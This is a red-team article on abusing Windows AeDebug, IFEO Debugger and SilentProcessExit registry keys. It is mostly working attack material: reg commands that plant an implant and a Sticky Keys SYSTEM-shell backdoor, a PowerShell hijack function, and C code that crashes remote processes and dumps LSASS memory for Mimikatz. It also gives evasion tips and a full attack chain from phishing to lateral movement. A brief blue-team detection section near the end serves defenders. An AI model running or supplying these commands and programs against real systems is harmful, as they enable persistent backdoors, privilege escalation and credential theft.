# Windows Debug API as a Red Team Vector: AeDebug, IFEO, and SilentProcessExit Persistence, UAC Bypass, and Credential Dumping

## 1. Introduction

Windows debugging infrastructure exposes legitimate registry-based mechanisms that, when abused, provide stealthy persistence, privilege escalation, and credential dumping outside the well-trodden paths of Run keys, scheduled tasks, or service creation. Microsoft openly documents these mechanisms - AeDebug, IFEO Debugger, and SilentProcessExit - yet they remain under-monitored by many defensive stacks.

This article covers all three techniques, their interplay with Windows Error Reporting (WER), and provides working Proofs of Concept for each.

---

## 2. AeDebug - Postmortem Debugger Persistence

### 2.1. How It Works

When an application crashes (unhandled exception), the following sequence occurs:

1. The kernel raises the exception -> UnhandledExceptionFilter is invoked
2. If no user-mode debugger is attached, Windows Error Reporting (WerSvc) is triggered
3. WerSvc spawns **WerFault.exe**
4. WerFault reads HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug
5. If Auto = 1, the command in Debugger executes **immediately** - no dialog
6. Placeholders %ld %ld are replaced with the crashing process PID and event handle

### 2.2. Registry Structure

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug
  |-- Auto        (REG_SZ) = "1"            - 1 = silent execution, 0 = prompt user
  |-- Debugger    (REG_SZ) = "C:\tools\payload.exe -p %ld -e %ld"
  |-- AutoExclusionList\
       |-- DWM.exe = 1                      - DWM excluded by default

HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug  - 32-bit on 64-bit
HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug               - per-user variant
```

### 2.3. Key Properties for Red Team

| Property | Detail |
|---|---|
| **No validation** | Windows does not verify the Debugger value points to an actual debugger - any executable works |
| **Integrity inheritance** | The payload runs at the **same integrity level** as the crashing process |
| **No file required** | The Debugger value can point to a script interpreter (cscript, powershell) or a command |
| **Per-user variant** | HKCU\...\AeDebug works without admin rights, limited to the current user session |

### 2.4. PoC: Setting AeDebug for Silent Payload Execution

```batch
:: Requires administrative privileges for HKLM
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /t REG_SZ /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Debugger /t REG_SZ /d "C:\Windows\Tasks\implant.exe" /f

:: Also set for 32-bit processes on 64-bit systems
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Auto /t REG_SZ /d "1" /f
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v Debugger /t REG_SZ /d "C:\Windows\Tasks\implant.exe" /f
```

### 2.5. PoC: Triggering Without Waiting for a Real Crash

```c
// trigger_crash.c - compile with: x86_64-w64-mingw32-gcc trigger_crash.c -o trigger_crash.exe
#include <windows.h>

int main() {
    // Method 1: Access violation (null pointer dereference)
    __try {
        int* p = NULL;
        *p = 0xDEAD;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        // If SEH catches it, force an unhandled exception via RaiseException
        RaiseException(0xC0000005, 0, 0, NULL);
    }

    // Method 2: Division by zero
    __try {
        int zero = 0;
        int result = 1 / zero;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        RaiseException(0xC0000094, 0, 0, NULL);
    }

    return 0;
}
```

Or via PowerShell, a one-liner that crashes any process:

```powershell
# Trigger crash in a target process by killing explorer (auto-restarted by Windows)
Stop-Process -Name explorer -Force

# Or spawn a crashing process directly
Start-Process -FilePath "cmd.exe" -ArgumentList "/c timeout.exe /t 1 > nul & exit /b 1" -WindowStyle Hidden
```

A more elegant approach - inject a crash into a specific elevated process:

```c
// crash_remote.c - force crash a target process by PID
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI* pNtRaiseHardError)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    HARDERROR_RESPONSE_OPTION ResponseOption,
    PHARDERROR_RESPONSE Response
);

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: crash_remote.exe <PID>\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                  PROCESS_CREATE_THREAD |
                                  PROCESS_VM_OPERATION |
                                  PROCESS_VM_WRITE, FALSE, pid);

    if (!hProcess) {
        printf("OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pRaiseException =
        (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "RaiseException");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        pRaiseException, (LPVOID)0xC0000005, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, 5000);
        CloseHandle(hThread);
        printf("Crash triggered in process %lu\n", pid);
    } else {
        printf("CreateRemoteThread failed: %lu\n", GetLastError());
    }

    CloseHandle(hProcess);
    return 0;
}
```

---

## 3. IFEO Debugger - Process Creation Hijacking

### 3.1. How It Works

Image File Execution Options (IFEO) allow a developer to attach a debugger to a specific executable. When the target process is launched, the system prepends the Debugger value to the command line - effectively running debugger.exe target.exe instead.

### 3.2. Registry Structure

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
  |-- <target.exe>\
       |-- Debugger (REG_SZ) = "C:\payload.exe"
```

### 3.3. Classic Lolbin: Sticky Keys Backdoor (sethc.exe)

The most well-known abuse of IFEO targets accessibility binaries that execute at the login screen (high integrity, no authentication required):

```batch
:: Sticky Keys backdoor - press Shift 5 times at login screen to get SYSTEM shell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f

:: Other useful targets at the login screen:
:: utilman.exe  ->  Windows+U
:: osk.exe      ->  On-Screen Keyboard
:: magnify.exe  ->  Windows+Plus
:: narrator.exe ->  Windows+Enter
```

### 3.4. PoC: IFEO For Any Application

```batch
:: Hijack notepad.exe - every time it runs, payload runs instead
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\Tasks\implant.exe" /f

:: To undo
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /f
```

### 3.5. PowerShell Implementation

```powershell
function Set-IFEOHijack {
    param(
        [string]$TargetBinary = "notepad.exe",
        [string]$PayloadPath = "C:\Windows\Tasks\implant.exe"
    )

    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$TargetBinary"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "Debugger" -Value $PayloadPath
    Write-Host "[+] IFEO hijack set for $TargetBinary -> $PayloadPath"
}

Set-IFEOHijack -TargetBinary "sethc.exe" -PayloadPath "C:\Windows\System32\cmd.exe"
```

---

## 4. SilentProcessExit - The Stealthiest of the Three

### 4.1. How It Works

SilentProcessExit is an IFEO extension that triggers **when a process exits** (not when it crashes or launches). It uses WerFault.exe to execute a monitor process. This is documented by Microsoft for developers monitoring process terminations, but it is **extremely useful for red team** because:

- The trigger is natural process termination - no crash required
- WerFault.exe (auto-elevated binary) spawns the monitor process
- The technique works with RtlReportSilentProcessExit - a function that **does not actually terminate the process** (useful for LSASS dumping)

### 4.2. Registry Requirements

Three registry values must be set:

```
1. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<target.exe>
     |-- GlobalFlag (REG_DWORD) = 0x200      - FLG_MONITOR_SILENT_PROCESS_EXIT

2. HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\<target.exe>
     |-- ReportingMode (REG_DWORD) = 1       - 1 = launch monitor, 2 = create dump
     |-- MonitorProcess (REG_SZ) = "C:\payload.exe"
```

### 4.3. PoC: SilentProcessExit for Persistence

```batch
:: Trigger implant.exe every time notepad.exe exits
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "C:\Windows\Tasks\implant.exe" /f

:: Test: open notepad, close it, watch implant.exe execute
```

### 4.4. PoC: LSASS Dumping Without Terminating LSASS

This is the most powerful application. By calling RtlReportSilentProcessExit on a handle to lsass.exe, we trigger WER to dump LSASS memory **without killing the process**. The dump file can then be parsed with Mimikatz.

The registry setup:

```batch
:: Configure LSASS for silent process exit monitoring
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
```

> **Note**: ReportingMode = 2 means "create a dump file" (full memory dump). The dump is written by WerFault.exe to the configured LocalDumps path or the default location (%LOCALAPPDATA%\CrashDumps).

The C code to trigger it:

```c
// dump_lsass_silent.c - trigger LSASS dump without termination
// Compile: x86_64-w64-mingw32-gcc dump_lsass_silent.c -o dump_lsass_silent.exe
#include <windows.h>
#include <stdio.h>

// Undocumented ntdll function
typedef NTSTATUS (NTAPI* pRtlReportSilentProcessExit)(
    HANDLE ProcessHandle,
    NTSTATUS ExitStatus
);

BOOL EnableSeDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    CloseHandle(hToken);
    return result;
}

int main() {
    if (!EnableSeDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Administrator.\n");
        return 1;
    }

    // Find LSASS PID
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    lsassPid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }

    if (lsassPid == 0) {
        printf("[-] LSASS not found\n");
        return 1;
    }

    printf("[+] LSASS PID: %lu\n", lsassPid);

    // Open LSASS with PROCESS_VM_READ (required for dump)
    HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsass) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }

    // Get RtlReportSilentProcessExit from ntdll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pRtlReportSilentProcessExit RtlReportSilentProcessExit =
        (pRtlReportSilentProcessExit)GetProcAddress(ntdll, "RtlReportSilentProcessExit");

    if (!RtlReportSilentProcessExit) {
        printf("[-] RtlReportSilentProcessExit not found\n");
        CloseHandle(hLsass);
        return 1;
    }

    // Trigger the dump - LSASS does NOT terminate
    printf("[+] Triggering LSASS dump...\n");
    NTSTATUS status = RtlReportSilentProcessExit(hLsass, 0);
    printf("[+] RtlReportSilentProcessExit returned: 0x%08lx\n", status);
    printf("[+] Check %s\\CrashDumps for lsass.dmp\n", getenv("LOCALAPPDATA"));

    CloseHandle(hLsass);
    return 0;
}
```

### 4.5. SilentProcessExit Detection Evasion

| Technique | Evasion Value |
|---|---|
| **GlobalFlag = 0x200** is 512 decimal | Can blend as one flag among many in a legitimate IFEO setup |
| **Autoruns does not report SilentProcessExit** | Confirmed by SpecterOps (2025) - it only surfaces the Debugger value |
| **MonitorProcess path** | Use LOLBins for execution: C:\Windows\System32\rundll32.exe payload.dll,EntryPoint |
| **ReportingMode = 1** (launch process) vs **2** (dump) | Mode 1 is less obvious - no dump files created on disk |

---

## 5. Combined Attack Chain: Full Scenario

Here is a complete chain integrating all three techniques in a red team engagement:

```
Phase 1: Initial Access (e.g., phishing)
  |
Phase 2: Implant drops
  |-- implant.exe          -> C2 beacon
  |-- trigger_crash.exe    -> forces controlled crash
  |-- setup_persistence.bat
       |
Phase 3: setup_persistence.bat runs
  |-- AeDebug          -> HKLM\...\AeDebug\Debugger = implant.exe
  |-- IFEO (sethc)     -> HKLM\...\IFEO\sethc.exe\Debugger = cmd.exe
  |-- SilentProcessExit -> HKLM\...\SilentProcessExit\notepad.exe\MonitorProcess = implant.exe
       |
Phase 4: Privilege Escalation
  |-- Press Shift 5x at login -> SYSTEM shell via sethc.exe IFEO
  |-- Or wait for any app crash -> AeDebug fires implant as elevated user
       |
Phase 5: Credential Access
  |-- Configure SilentProcessExit for lsass.exe
  |-- Call RtlReportSilentProcessExit -> dump lsass.dmp -> Mimikatz
       |
Phase 6: Lateral Movement
  |-- Remote registry via WMI -> configure AeDebug/IFEO on target machines
  |-- Force crash on target -> payload executes
```

---

## 6. Detection Guidance (for Blue Teams)

| Technique | Sigma / KQL Signature |
|---|---|
| **AeDebug** | reg.exe add HKLM\...\AeDebug\Debugger or any non-standard debugger path |
| **IFEO** | reg.exe add HKLM\...\Image File Execution Options\*\Debugger where path != vsjitdebugger.exe or windows.exe |
| **SilentProcessExit** | GlobalFlag = 0x200 outside of GFlags tool; MonitorProcess pointing to non-Microsoft binaries |
| **WerFault as parent** | Parent process is WerFault.exe and child is not a Microsoft debugger |

**Sysmon rules**:
- Event ID 13 (RegistryEvent) for all three key paths
- Event ID 1 (ProcessCreate) where ParentImage contains WerFault.exe and Image is not windbg.exe, cdb.exe, ntsd.exe, or vsjitdebugger.exe

---

## 7. Conclusion

The Windows Debug API registry mechanisms - AeDebug, IFEO, and SilentProcessExit - provide red teams with three complementary persistence and privilege escalation vectors that operate at the registry level without creating services, scheduled tasks, or startup folder entries. SilentProcessExit, in particular, offers a stealthy LSASS dumping technique that doesn't terminate the target process and is not reported by Autoruns by default.

These techniques are documented by Microsoft, authorized for use in authorized security assessments, and require no zero-days or kernel exploits - just registry keys that Windows trusts by design.

---

## References

- [Microsoft: Configuring Automatic Debugging](https://learn.microsoft.com/en-us/windows/win32/debug/configuring-automatic-debugging)
- [Microsoft: Monitoring Silent Process Exit](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit)
- [MITRE ATT&CK: T1546.012 - Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012/)
- [Oddvar Moe: Persistence using GlobalFlags in IFEO](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)
- [Hexacorn: SilentProcessExit - quick look under the hood](https://www.hexacorn.com/blog/2019/09/19/silentprocessexit-quick-look-under-the-hood/)
- [Deep Instinct: LSASS Memory Dumps are Stealthier than Ever Before](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)
- [CompassSecurity: PowerLsassSilentProcessExit](https://github.com/CompassSecurity/PowerLsassSilentProcessExit)
- [Infiltr8: AEDebug Keys Persistence](https://red.infiltr8.io/redteam/persistence/windows/aedebug-keys)
- [PentestLab: IFEO Injection](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
